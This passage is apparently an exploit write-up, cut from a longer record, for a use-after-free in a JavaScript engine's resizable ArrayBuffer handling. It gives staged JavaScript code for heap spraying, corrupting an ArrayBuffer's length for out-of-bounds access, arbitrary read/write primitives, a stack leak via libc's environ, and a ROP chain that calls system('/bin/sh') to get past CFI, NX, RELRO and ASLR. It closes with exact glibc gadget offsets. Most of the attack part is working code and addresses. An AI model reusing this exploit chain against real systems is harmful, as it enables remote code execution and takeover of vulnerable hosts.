0x1e7ac0n - 0x60n;\n```\n\n### Stage 2: Out-of-Bounds Access\n\nThe vulnerability creates a corrupted JSArrayBuffer with massive byte_length:\n\n1. Create 56-byte resizable ArrayBuffer (same size as JSArrayBuffer struct)\n2. In `valueOf()`, resize and spray 200 new ArrayBuffers with markers\n3. One spray buffer reuses the freed 56-byte chunk\n4. `Atomics.exchange()` writes 0x1000000110000000 to byte 0\n5. This corrupts the JSArrayBuffer\'s byte_length field\n\n```javascript\nlet uaf_ab = new ArrayBuffer(56, { maxByteLength: 65536 });\nlet mal = {\n    valueOf: function() {\n        uaf_ab.resize(32768);\n        for (let i = 0; i < 200; i++) spray.push(new ArrayBuffer(32));\n        return 0x1000000110000000n;  // Becomes byte_length!\n    }\n};\nAtomics.exchange(uaf_u64, 0, mal);\n// One spray buffer now has byte_length = 0x10000000 (268MB)\n```\n\n### Stage 3: Arbitrary Read/Write\n\nUsing the OOB buffer, we locate and corrupt another JSArrayBuffer\'s data pointer:\n\n1. Scan OOB buffer for JSArrayBuffer signatures (size field = 0xffffffff00000020)\n2. Find spray[2]\'s JSArrayBuffer by matching marker at data[0]\n3. Overwrite data pointer to read/write arbitrary addresses\n\n```javascript\n// JSArrayBuffer structure:\n// [0] byte_length (4) | max_byte_length (4) = 0xffffffff00000020\n// [1] shared_array_buffer_count (8)\n// [2] data pointer <-- we corrupt this!\n\nfunction read64(addr) {\n    oob[jab2_idx + 2] = addr;  // Set data pointer\n    return new BigUint64Array(spray[2].buf)[0];\n}\n```\n\n### Stage 4: Stack Address Leak\n\nRead the `environ` pointer from libc\'s data section:\n\n```javascript\nlet environ_ptr = read64(libc_base + 0x1eee28n);\n// environ points to envp array on stack\n```\n\n### Stage 5: CFI Bypass via ROP\n\n**Key Insight**: Clang CFI validates indirect call/jump targets against type metadata. However, **return instructions (`ret`)** are NOT protected by CFI - they simply pop the return address from the stack.\n\nBy overwriting a return address with our ROP chain, we completely bypass CFI:\n\n```javascript\n// Find __libc_start_main\'s return address (where main() returns to)\n// Write ROP chain:\nwrite64(target_addr, ret_gadget);        // Stack alignment\nwrite64(target_addr + 8n, pop_rdi);       // pop rdi; ret\nwrite64(target_addr + 16n, bin_sh);       // "/bin/sh" string\nwrite64(target_addr + 24n, system_addr);  // system()\n```\n\nWhen the JS script finishes and eventually returns to `__libc_start_main`, the ROP chain executes:\n\n1. `ret` - stack alignment (required for system() on x86-64)\n2. `pop rdi; ret` - loads "/bin/sh" into rdi\n3. `system("/bin/sh")` - spawns shell\n\n## Protection Bypass Summary\n\n| Protection | Bypass Method |\n|------------|---------------|\n| ASLR/PIE | Unsorted bin leak reveals libc base |\n| Full RELRO | Stack ROP instead of GOT overwrite |\n| NX | ROP uses existing code gadgets |\n| CFI | Return addresses not protected by CFI |\n\n## ROP Gadgets Used\n\nFrom libc (glibc 2.41):\n- `pop rdi; ret` @ libc + 0x2a145\n- `ret` @ libc + 0x2846b (for 16-byte stack alignment)\n- `system` @ libc + 0x53110\n- `/bin/sh` @ libc + 0x1a7ea4\n\n## Files\n\n- **Exploit**: `/tmp/work/rop_shell.js`\n- **Analysis**: `/tmp/work/analysis.md`\n')])
